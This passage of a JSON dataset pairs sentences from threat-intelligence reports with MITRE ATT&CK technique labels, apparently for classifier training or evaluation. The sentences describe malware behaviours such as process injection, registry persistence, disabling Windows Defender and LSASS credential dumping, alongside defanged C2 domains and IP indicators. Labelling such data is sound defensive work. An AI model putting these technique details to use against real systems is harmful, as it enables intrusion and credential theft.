    "text": "A  variant gathers network interface card information.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "can delete files and folders from compromised machines.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "has used cmd.exe /c and batch files for execution. ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has been seen loaded into msiexec.exe through process hollowing to hide its execution.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "has used  to gather system information.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "uses HTTPS for command and control.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "gathers user names from infected hosts.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "In one instance, a log file recovered from an open indexed server revealed that an IP address (112.66.188.28) located in Hainan, China had been used to administer the command and control node that was communicating with malware on victim machines",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Anyconnect[.]stream Bigip[.]stream Fortiweb[.]download Kaspersky[.]science microtik[.]stream owa365[.]bid symanteclive[.]download windowsdefender[.]win  The listed C2 servers all resolved to IPs belonging to a service provider in China at 1.2.9.0/24, which is the IP address used by the C2 server to send a cancel communications message to the end system",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Windows Defender, other anti-malware solutions and monitoring tools are disabled utilizing a process explorer tool,",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "has conducted C2 communications with a Dropbox account using the HTTP API.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "has attempted to get users to launch malicious Microsoft Word attachments delivered via spearphishing emails.(Citation: Symantec Tick Apr 2016)",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "stealing sensitive data from the victim’s networks.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "During  threat actors used valid VPN credentials to gain initial access.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "can determine the Windows version and computer name on a compromised host.(Citation: Cybereason Valak May 2020)",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "can collect data and files from a compromised host.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "has used HTTP for C2 communication.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "tasklist was also used in order to enumerate processes on multiple hosts remotely",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "A scheduled task was created at that time to maintain persistence on this host",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "HTTP variant",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "can download and execute new plugins from the C2 server. (Citation: Prevx Carberp March 2011)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to download additional modules and a configuration file from C2.(Citation: IBM IcedID November 2017)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "cmd\" /c",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has a command to list files on a system.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "MAC address",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "has temporarily stored collected information to the files `%AppData%\\{Unique Identifier}\\HOSTRURKLSR` and `%AppData%\\{Unique Identifier}\\NEWERSSEMP`.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "use of the same DeviceControl API methods",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "to load a binary into memory that injects",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "A local account was used by the Threat Actor",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to use  to identify system information.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "downloads browser specific AppleScript modules using a constructed URL with the curl command https:// & domain & /agent/scripts/ & moduleName & .applescript.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Windows Service Creation",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "Create its own registry key in \\SOFTWARE\\<uniquename>",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "has dropped malicious files into the startup folder `%AppData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup` on a compromised host in order to maintain persistence.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "uses a backdoor known as BADFLICK that is is capable of generating a reverse shell and has used multiple types of scripting for execution including JavaScript and JavaScript Scriptlets in XML.(Citation: Proofpoint Leviathan Oct 2017).",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has used  to gather the OS version as well as information on the system configuration BIOS the motherboard and the processor.(Citation: F-Secure BlackEnergy 2014)",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "call RtlAddVectoredExceptionHandler API",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "can download additional modules from the C2 server.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can check for blocklisted usernames on infected endpoints.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "can detect network adapter and IP address information.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "that would cause registry changes",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to download files from its C2 server.(Citation: Cybereason Egregor Nov 2020)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "uses HTTP for C2.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "can check for installed software on the system under the Registry key Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "can enumerate Registry keys.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "During  threat actors relied on a victim to enable macros within a malicious Word document.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "it prompts the user with a fake message to double-click on open to view the attachment.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Appendix Malware Family Descriptions    Malware Family  Description  Availability    DROPSHOT  Dropper that has been observed dropping and launching the TURNEDUP backdoor, as well as the SHAPESHIFT wiper malware  Non-Public    NANOCORE  Publicly available remote access Trojan (RAT) available for purchase",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to browse files in directories such as Program Files and the Desktop. ",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has used RDP during operations.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "has used various Windows API calls.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to delete files on the compromised host.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "can enumerate files and directories.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "users still need to manually mount them and run the fake PDFs to trigger the infection chain",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "can open random files and Registry keys to obscure malware behavior from sandbox analysis.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "They also retrieve networking information, like network adapters, specific machines, and network services like  Remote Desktop Protocol (RDP).",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "has added a registry key in the <RUN> hive for persistence.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "regularly deploys both publicly available (ex: ) and custom password retrieval tools on victims.(Citation: ESET Sednit Part 2)(Citation: DOJ GRU Indictment Jul 2018) They have also dumped the LSASS process memory using the MiniDump function.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "are downloaded and executed in the victim's system",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "malware pulled down and executed a Cobalt Strike payload on",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has used `fsutil fsinfo drives` `systeminfo` and `vssadmin list shadows` for system information including shadow volumes and drive information.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "can obtain information about the logged on user both locally and for Remote Desktop sessions.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "can retrieve the victims username.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "the malware needs to read\nand decrypt those registry key values",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "Stops the WinDefend service (Windows Defender)",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "to the C2 through the HTTP protocol.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "During  threat actors leveraged embedded shellcode to inject a downloader into the memory of Word.  ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "exfiltrates data collected from the victim mobile device.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "bat script:",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "systeminfo",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "can use WMI for lateral movement.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "has used a Registry Run key to establish persistence by executing JavaScript code within the rundll32.exe process.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "executes cmd.exe and uses a pipe to read the results and send back the output to the C2 server.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "downloads additional plug-ins to load on the victims machine including the ability to upgrade and replace its own binary.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "uses  to communicate with the C2 server over HTTP.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "has collected the Service Pack language and region information to send to the C2.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "can use Windows API functions such as WriteFile CloseHandle and GetCurrentHwProfile during its collection and file storage operations.  can execute its embedded components via CreateProcessA and ShellExecute.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "the threat actor deactivated antivirus protocols",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "performs code injection injecting its own functions to browser processes.(Citation: F-Secure Sofacy 2015)",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Instructions within guide.txt explaining how to carry out DNS hijacking attack In one part of guide.txt, an example target appears to be provided, with a corresponding adversary IP (185.162.235[.]106) for the legitimate domain to be redirected to",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "The injected process",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "RPC backdoors can upload files from victim machines.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "can make an HTTPS connection to download additional files.(Citation: Unit 42 WhisperGate January 2022)",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "installer plugin can schedule a new task that loads the dispatcher on boot/logon.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "This script called a combination of QueueUserAPC, GetCurrentThreadId, OpenThread, and VirtualAlloc to perform process injection of shellcode",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "scans for these cryptocurrency wallets in local directories:\nArmory\nAtomic Wallet\nBinance\nBitcoin\nBlockstream Green\nCoinomi\nDelta\nElectrum\nExodus\nGuarda\nJaxx Liberty\nLedger Live\nTrezor Bridge",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "creating a hash of the collected data, to which it then appends its current process id.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "has staged stolen files in the C:\\AMD\\Temp directory.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "can delete files it creates from the infected system.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "enumerates Registry keys associated with event logs.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "can determine whether the ISO payload was received by a Windows or iOS device.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has injected a malicious DLL into the Windows Media Player process (wmplayer.exe).",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "--serviceService Type: user mode serviceService Start Type: auto startService Account: LocalSystem",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "then the full set of malware is retrieved from C2",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has installed a Windows service to maintain persistence on victim machines.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "can download and execute additional payloads including through the use of a `Dex` command.(Citation: Google EXOTIC LILY March 2022)(Citation: Proofpoint Bumblebee April 2022)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "ReadRegistryValue",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "has used open-source C2 frameworks including Covenant.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "can remove files from a targeted system.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "can make a direct SQL connection to a Microsoft database controlled by the attackers retrieve an item from the bindata table then write and execute the file on disk.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has utilized techniques like reflective DLL loading to write a DLL into memory and load a shell that provides backdoor access to the victim.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "using Command Prompt.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "kills security tools like Wireshark that are running.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "achieves persistence by creating a shortcut in the Startup folder.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "these are the same commands as observed in the \".bat\" files:",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "utilized RDP throughout an operation.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "has used HTTP for C2 communications.(Citation: Unit 42 Bisonal July 2018)",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "modifies several Registry keys under HKCU\\Software\\Microsoft\\Internet Explorer\\ PhishingFilter\\ to disable phishing filters.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to download files to a compromised host.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has relied on user interaction to open their malicious RTF documents.(Citation: TrendMicro Tonto Team October 2020) ",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "has used process hollowing to inject into child processes.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "copies itself to disk and creates an associated run key Registry entry to establish.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "When each file is encrypted, registry keys are created under HKU\\{SID}\\Software\\Microsoft\\ RestartManager \\ which are used to track metadata pertaining to the file being encrypted, such as owner, sequence, session and file hash",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "can inject a DLL into `rundll32.exe` for execution.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "delivered different payloads including  in at least one instance.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has relied upon users clicking on a malicious attachment delivered through spearphishing.(Citation: Trend Micro Banking Malware Jan 2019)(Citation: Carbon Black Emotet Apr 2019)",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "has the capability to download files from the C2 server.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can collect the machine information system architecture the OS version computer name Windows product name the number of CPU cores video card information and the system language.(Citation: Unit42 Azorult Nov 2018)",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "can inject its payload DLL Into memory.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "establishes Persistence by setting the HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\Load Registry key to point to its executable.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "macOS backdoor can receive a delete command.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "cmd.exe /C rundll32.exe",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "has used whoami to identify the local user and their privileges.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "file download/upload",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "It then picks one random C&C URL out of the three available and constructs a GET request",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "allows cyber threat actors to execute arbitrary system commands,",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "can download files from C2.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can execute binaries through process hollowing.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "creates a batch file in %WINDOWS%\\Temp called registry.bat.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "can enumerate all running processes to compare hashes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "communicated over HTTP and HTTPS with C2 servers.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "can inject a variety of payloads into processes dynamically chosen by the adversary.(Citation: cobaltstrike manual)(Citation: Cobalt Strike Manual 4.3 November 2020)",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "which in turn injects the payload(s) into its own or a remote process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "collects the computer name the BIOS model and execution path.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "by querying the Software\\SimonTatham\\Putty\\Sessions registry key.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "collects the hostname of the target computer. ",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "the task or service attains persistence by being set to start automatically on boot",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "cyber actors used valid accounts to log into a service specifically designed to accept remote connections,",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "It searches the active process list for the systemd process",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "has used HTTP GET and POST requests for C2.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "can download additional malware from the C2 server.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to upload files from victim's machines.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "can execute commands via the command line utility.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Disable Automatic Update and change Windows configurations related to Windows Update",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "utilizes Run Registry keys in the HKLM hive as a persistence mechanism.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "can obtain a process list from the victim.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "GetRegistrySubKeyAndValueNames",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to upload files from a compromised host.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "utilized RDP for direct remote point-and-click access. ",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "can create a new service to establish persistence.(Citation: Nccgroup Gh0st April 2018)",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "created a persistence mechanism for UltraVNC by adding the\napplication to the ConhostNT value under the current users Run\nregistry key.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "can search through folders and files on the system.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has moved laterally using the Local Administrator account.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Windows system WMI data is stored in the WMI common information model (CIM) repository, which consists of several files in the System32\\wbem\\Repository directory",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Sets Network Protection to audit mode in Windows Defender",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "deleted files from the system. ",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "has hardcoded API calls within its functions to use on the victim's machine. ",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Open directory listing of hxxp://stevemike-fireforce[.]info/ Based on the contents and structure of the initial identified open directories, it was possible to find several infrastructure patterns in use",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to search for specific files.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has collected the username and UID from the infected machine.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "local accounts.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "has relied upon users clicking on a malicious attachment delivered through spearphishing.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "can set the KeepPrintedJobs attribute for configured printers in SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Print\\\\Printers to enable document stealing.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "can establish persistence by writing the Registry value MicroNativeCacheSvc to HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "created a shortcut in the Windows startup folder to launch a PowerShell script each time the user logs in to establish persistence.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "communicates with a hardcoded IP address via HTTP.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "collects hostname volume serial number and OS version data from the victim and sends the information to its C2 server.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "collects information about the OS (version build type install date) as well as system up-time upon receiving a connection from a backdoor.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "can add itself to the Registry key HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run for persistence.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "Displayed below are these new, xml formatted plugin names “weap_hwi”, “ps”, and “vsnet” in a BlackEnergy configuration file download from a c2 server",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "collects information from the victim including installed drivers programs previously executed by users programs and services configured to automatically run at startup files and folders present in any user's home folder files and folders present in any user's My Documents programs installed to the Program Files folder and recently accessed files folders and programs.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "\"cmd\" /c",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "is capable of downloading additional files through C2 channels including a new version of itself.(Citation: Forcepoint Monsoon)(Citation: PaloAlto Patchwork Mar 2018)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "During  UNC3890 actors downloaded tools and malware onto a compromised host.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can collect the OS version system architecture uptime and computer name.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "the batch file",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "the threat actor started their first lateral movement using RDP to pivot to a server using the local Administrator account.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "leverages cmd.exe to perform discovery techniques.  loads malicious shellcode and executes it in memory.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has used a variety of publicly available tools like   and ProcDump to dump credentials.(Citation: Symantec Elfin Mar 2019)",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "is used to connect to a server using the default credentials",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "has added persistence via the Registry key HKCU\\Software\\Microsoft\\CurrentVersion\\Run\\ and dropped a shortcut in %STARTUP%.(Citation: Fidelis njRAT June 2013)",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to enumerate files and drives.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "can use rundll32.exe to gain execution.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "collects the victims computer name processor architecture OS version volume serial number and system type.(Citation: FireEye FELIXROOT July 2018)",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has used several tools to scan for open NetBIOS nameservers and enumerate NetBIOS sessions.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "conducted credential harvesting\nvia dumping LSASS memory.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "can use DeleteFileA to remove files from infected hosts.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "can obtain the OS version and build computer name and processor architecture from a compromised host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor regularly interrogated other systems using tasklist.exe",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Username information",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors used the compromised administrator account",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "can detect a running process's PID on the infected machine.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "using UltraVNC to download and store\na file",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "and then downloads a second-stage backdoor from the OpenDrive cloud service.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "is installed as a new service on the system.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "LSASS process to access credentials.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "the ransomware drops a batch file",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "invoking comsvcs.dll with rundll32.exe,",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "has used spearphishing attachments to infect victims.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "has used Windows Scheduled Tasks to establish persistence on local and remote hosts.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
